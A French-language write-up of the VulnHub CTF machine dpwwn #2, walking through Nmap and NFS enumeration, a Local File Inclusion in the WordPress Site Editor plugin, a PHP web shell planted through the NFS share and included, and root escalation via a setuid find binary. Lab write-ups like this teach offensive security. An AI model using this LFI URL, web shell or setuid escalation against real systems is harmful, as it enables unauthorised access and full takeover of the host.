---
title: "Solution du CTF dpwwn #2 de VulnHub"
tags: [CTF, VulnHub]
---

Le CTF [dpwwn: 2](https://vulnhub.com/entry/dpwwn-2,343/) est très classique dans sa réalisation mais permettra aux débutants en CTF d'apprendre quelques choses.

Je commence par un scan Nmap qui me révèle la présence d'un Wordpress :

```console
$ sudo nmap -sCV -p- -T5 --script vuln 192.168.56.190
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 10:06 CEST
Nmap scan report for 192.168.56.190
Host is up (0.00023s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.38 ((Ubuntu))
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
--- snip ---
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.38 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38886/udp   mountd
|   100005  1,2,3      43075/tcp6  mountd
|   100005  1,2,3      44328/udp6  mountd
|   100005  1,2,3      50777/tcp   mountd
|   100021  1,3,4      35477/tcp6  nlockmgr
|   100021  1,3,4      39079/tcp   nlockmgr
|   100021  1,3,4      42544/udp6  nlockmgr
|   100021  1,3,4      60931/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
443/tcp   open  http     Apache httpd 2.4.38 ((Ubuntu))
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
--- snip ---
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.38 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
2049/tcp  open  nfs_acl  3 (RPC #100227)
38091/tcp open  mountd   1-3 (RPC #100005)
39079/tcp open  nlockmgr 1-4 (RPC #100021)
44503/tcp open  mountd   1-3 (RPC #100005)
50777/tcp open  mountd   1-3 (RPC #100005)
```

`nfs` est présent avec `mountd`. On peut utiliser `showmount` pour lister les partages :

```console
$ showmount -e 192.168.56.190
Export list for 192.168.56.190:
/home/dpwwn02 (everyone)
```

Le dossier en question est vide, mais il va vite devenir utile.

En regardant le code source du Wordpress je vois des références au plugin `Site Editor` :

```html
<!-- Built With SiteEditor | http://www.siteeditor.org --> 
<script type='text/javascript' src='http://10.10.10.10/wordpress/wp-content/plugins/site-editor/framework/assets/js/sed_app_site.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://10.10.10.10/wordpress/wp-content/plugins/site-editor/assets/js/livequery/jquery.livequery.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://10.10.10.10/wordpress/wp-content/plugins/site-editor/assets/js/livequery/sed.livequery.min.js?ver=1.0.0'></script>
```

Ce dernier est vulnérable à une (vrai) faille d'inclusion :

[WordPress Plugin Site Editor 1.1.1 - Local File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/44340)

Je peux ainsi lister les utilisateurs avec cette URL :

`http://192.168.56.190/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`

Je remarque la présence d'un compte `rootadmin` :

```
rootadmin:x:1000:1000:rootadmin:/home/rootadmin:/bin/bash
```

On va avoir notre première utilité du partage NFS : on va copier une backdoor PHP dedans et l'appeler via l'inclusion.

```console
$ sudo mount 192.168.56.190:/home/dpwwn02/ /mnt/
$ echo '<?php system($_GET["cmd"]); ?>' | sudo tee /mnt/shell.php
```

Je profite aussi du nfs pour déposer un reverse-ssh.

Une fois un shell récupéré, je vérifie les paramètres du partage nfs et rien ne semble empêcher de déposer des binaires `setuid` :

```console
www-data@dpwwn-02:/home/rootadmin$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/dpwwn02       *(rw,root_squash)
/home/dpwwn02       10.10.10.100(rw,no_root_squash)
```

Seulement, le owner semble automatiquement droppé pour devenir `nobody` :

```console
$ sudo cp bash /mnt/
$ sudo chmod 4755 /mnt/bash 
$ ls -al /mnt/bash
-rwsr-xr-x 1 nobody nobody 1166912 30 avril  2023 /mnt/bash
```

NFS ne sera pas aujourd'hui notre solution pour passer root.

Une recherche sur les binaires setuid remonte la commande `find` :

```console
www-data@dpwwn-02:/home/rootadmin$ find / -type f -perm -u+s -ls 2> /dev/null 
      656     36 -rwsr-xr-x   1 root     root        34896 Mar  5  2019 /usr/bin/fusermount
      839     64 -rwsr-xr-x   1 root     root        63736 Mar 22  2019 /usr/bin/passwd
      551     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
     1120     36 -rwsr-xr-x   1 root     root        34888 Feb 22  2019 /usr/bin/umount
      648    312 -rwsr-xr-x   1 root     root       315904 Feb 16  2019 /usr/bin/find
     1051    156 -rwsr-xr-x   1 root     root       157192 Feb 19  2019 /usr/bin/sudo
      792     48 -rwsr-xr-x   1 root     root        47184 Feb 22  2019 /usr/bin/mount
--- snip ---
```

On va utiliser l'option `-exec` bien connue. Je spécifie des paramètres de recherche dont je sais qu'ils ne renverront qu'un seul résultat pour éviter que la commande ne soit lancée plusieurs fois (même si pour un `chmod` ce n'est pas grave) :

```console
www-data@dpwwn-02:/home/dpwwn02$ find /etc -name passwd -exec chmod 4755 /bin/dash \;
www-data@dpwwn-02:/home/dpwwn02$ dash -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# ls
dpwwn-02-FLAG.txt  snap
# cat dpwwn-02-FLAG.txt

Congratulation! You PWN this dpwwn-02. Hope you enjoy this boot to root CTF.
Thank you. 

46617323 
24337873 
4b4d6f6f 
72643234 
40323564 
4e443462 
36312a23 
26724a6d
```
